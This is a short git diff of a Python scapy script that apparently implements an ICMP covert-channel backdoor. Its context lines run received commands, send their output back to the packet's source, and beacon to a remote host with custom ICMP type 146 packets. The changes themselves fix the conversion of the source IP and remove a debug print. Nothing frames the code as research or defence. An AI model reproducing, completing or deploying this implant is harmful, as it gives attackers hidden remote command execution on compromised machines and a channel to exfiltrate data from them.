@@ -28,7 +28,7 @@ def cmd_proc(typ, code, source):
             print(result.stdout.decode())
         send_output(result.stdout.decode(), source)
     elif typ == 146:
-        sendbk = pkt.getlayer(IP).src.decode()
+        sendbk = str(pkt.getlayer(IP).src)
         heart(sendbk, 146)
 
 def breakup(data):
@@ -45,7 +45,7 @@ def send_output(stdout, sender):
 Or just checking to see if a response is recieved. IDK honestly. Gotta spend time drawing this out 
 """
 def heart(dest, protype):
-    print("TheLoaded RICK")
+
     #while True:
     send(IP(dst=dest)/ICMP(type=protype, code=1)/"abcdefghijklmnopqrstuvwxyz")
     #time.sleep(15)
